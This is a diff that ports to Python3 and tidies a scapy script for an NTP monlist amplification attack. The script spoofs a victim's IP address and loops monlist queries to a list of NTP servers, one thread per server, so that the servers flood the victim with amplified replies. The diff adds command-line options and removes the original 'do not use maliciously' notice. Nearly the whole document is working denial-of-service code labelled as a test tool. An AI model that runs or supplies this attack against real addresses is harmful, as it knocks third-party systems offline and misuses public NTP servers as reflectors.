@@ -1,12 +1,13 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 '''
 This script was taken from Ron Nilekani and modified for Python3, I found
 it to be quite useful to verify on an NTP Amplified Attack but I found it
-a bit cumbersome to use, the modifications are only intended for ease of
-use and updating it to Python3, nothing more.
+a bit cumbersome to use in the original shape, the modifications are only 
+intended for ease of use and updating it to Python3, nothing more.
 
 Vicente Manuel Munoz Milchorena - Vico Surge
+Tijuana, Mexico
 2019-09-28
 
 ---
@@ -28,116 +29,108 @@ Please feel free to reach out to me incase if you have any suggestions.
 
 #Importing the scapy library into my local namespace
 from scapy.all import *
-import sys, threading, time, argparse
-
-def introduction():
-	print("NTP AMPLIFICATION ATTACKS:")
-	print("MAKING MONLIST QUERY TO NTP SERVER USING IP ADDRESSING SPOOFING")
-	print("NTP SERVER would flood the target with amplified amount of data in response")
-	print("In order to stop the execution of this program, press CTRL-C")
-
-def how_to_use_script():
-	'''
-	This function expains how to use this script.
-	'''
-	print "Note: This script works for python 3.7.x or above."
-	print "Make sure to install scapy library on your local machine"
-	print "Please do not use this script for malicious reasons"
+import sys
+import threading
+import time
+import argparse
 
 def file_operations(ntpserverfile):
-	'''
-	This function works on opening the NTP server file and putting all the addresses in List.
-
-	'''
-	
+	# Get all the servers from the file we designated
+	# pass onto a list for ease of use
 	ntplist = []
+	try:
+		ntp_results = open(ntpserverfile, 'r')
+	except Exception as e:
+		print("[X] Error while performing read, verify error below. Script will end")
+		print(e)
+		exit()
+	for item in ntp_results:
+		ntplist.append(item.replace("\n",""))
+	ntp_results.close()
+	return ntplist
 
-	# Creating a file handle and opening the ntpserver file in read only format.
-        f = open(ntpserverfile, 'r')
-
-        # Using file operations to store the list of IP addresses in a list
-        # This is achieved using readlines method.
-        ntplist = f.readlines()
-
-        #Upon retrieving the data, we can close the file
-        f.close()
-
-  	return ntplist
-
-def ntp_attack():
-	'''
-	This function obtains all the variables required to form a network packet.
-	'''
-
-	#Import global variables into this function
-	global ntplist
-	global current_server
-	global target_address
-	ntp_server = ntplist[current_server] 
-	current_server = current_server + 1 
-	
-	# Pattern for NTP v2 Monlist Packet
-	ntp_data_pattern = "\x17\x00\x03\x2a" + "\x00" * 4
-
-	#Calling the scapy packet function.
-	scapy_packet(ntp_server, target_address, ntp_data_pattern)
-	         
-
-
-def scapy_packet(ntp_server, target_address, ntp_data_pattern):
+def scapy_packet(ntp_server, target_address):
 	'''
 	This is the core function of our program where we build  arbitary network packets 
 	and push them to our victim.
 	'''
+
+	# Pattern for NTP v2 Monlist Packet
+	ntp_data_pattern = "\x17\x00\x03\x2a" + "\x00" * 4
+
 	#Scapy packet format + load = 'data' <-- contains the mon-list command
 	#BUILDING THE PACKET
 	packet = IP(dst=ntp_server,src=target_address)/UDP(sport=51147,dport=123)/Raw(load=ntp_data_pattern)
 	
 	#PACKET FORMAT:
-	print
-	print "PACKET FORMAT:\n"
+	print("\nPACKET FORMAT:\n")
 	ls(packet)
 
 	#SENDING THE PACKET
-	print 
-	print "SENDING THE PACKET:\n"
-	print 
+	print("\nSENDING THE PACKET:\n")
 	send(packet,loop=1)
 	  
-def thread_function(numberthreads):
+def thread_function(numberthreads,ntplist,target_address):
 	'''
  	Calling the  function(ntp_attack) inside a thread
 	THIS FUNCTION WILL SPAWN THREADS PER NTP_SERVER
     	SYNTAX REFERENCED FROM http://pymotw.com/2/threading/ 
     	'''
-	
 	threads = []
 	for i in range(int(numberthreads)):
-                thread = threading.Thread(target=ntp_attack)
+                thread = threading.Thread(target=lambda: scapy_packet(ntplist[i],target_address))
                 thread.daemon = True # This is tied to stopping the program using CTRL-C as indica$
                 threads.append(thread)
                 thread.start()
 
-
-#Applying the technique to allow importable and executable code to co-exist
-
 if __name__ == "__main__":
-	
-	introduction()
-	how_to_use_script()
-	#Initializing the variables. Taking the input from the user in form of arguments.
-	target_address = raw_input("Enter the victim address:\n")
-	ntpserverfile = raw_input("Enter the name of the file containing the list of NTP Servers:\n")
-	numberthreads = raw_input("Enter the number of threads you want to use(Remember, it should be the same as the list of NTP servers:\n")
+	# Variables can be set through argparse or direct input here
+	parser = argparse.ArgumentParser(description="NTP Monlist Amplification Attack Test Tool")
+	parser.add_argument("-d","--debug", help="Debug application, set to 1 for debuging, default 0", 
+		default=0, type=int)
+	parser.add_argument("-t","--target", help="IP address to perform attack on", dest="target")
+	parser.add_argument("-f","--file", help="File containing the NTP servers", dest="file")
+	parser.add_argument("-T","--threads", dest="threads",
+		help="[Optional] Threads to use for attack, should be the same as the amount of servers, set to 0 for script to figure this out")
+	flags = parser.parse_args()
+	if flags.target:
+		target_address = flags.target
+	else:
+		target_address = input("[#] Enter the victim address: ")
+	if flags.file:
+		ntpserverfile = flags.file
+	else:
+		ntpserverfile = input("[#] Enter the name of the file containing the list of NTP Servers: ")
+	if flags.threads:
+		numberthreads = flags.threads
+	else:
+		numberthreads = input("[#] Enter the number of threads you want to use(Remember, it should be the same as the list of NTP servers:\n")
 	
 	#Creating and Initializing the list.
 	current_server = 0
 
-	# Performing the file operations to retrieve list of NTP servers	
+	# Performing the file operations to retrieve list of NTP servers
+	print("[#] Reading from provided file")
 	ntplist = file_operations(ntpserverfile)	
 	
+	# Dirty guessing at the amount of threads to be run, also send
+	# a warning before going crazy.
+	if int(numberthreads) == 0:
+		print("[#] Guessing number of servers from list")
+		numberthreads = len(ntplist)
+		if numberthreads > 15:
+			while True:
+				stop_me = input("You are using a large amount of servers, are you sure you wish to proceed? [Y/N] ")
+				if stop_me in ["n","N","no","NO","No"]:
+					print("[!] Exiting")
+					exit()
+				elif stop_me in ["y","Y","yes","YES","Yes"]:
+					print("[!] Hope you know what you are doing, here we go!")
+					break
+				else:
+					print("[X] Incorrect selection")
 	#Calling the thread function
-	thread_function(numberthreads)
+	thread_function(numberthreads,ntplist,target_address)
 	
 	# In order to avoid utilization 100% CPU, I am adding delay to  the code execution by one second
 	while True:
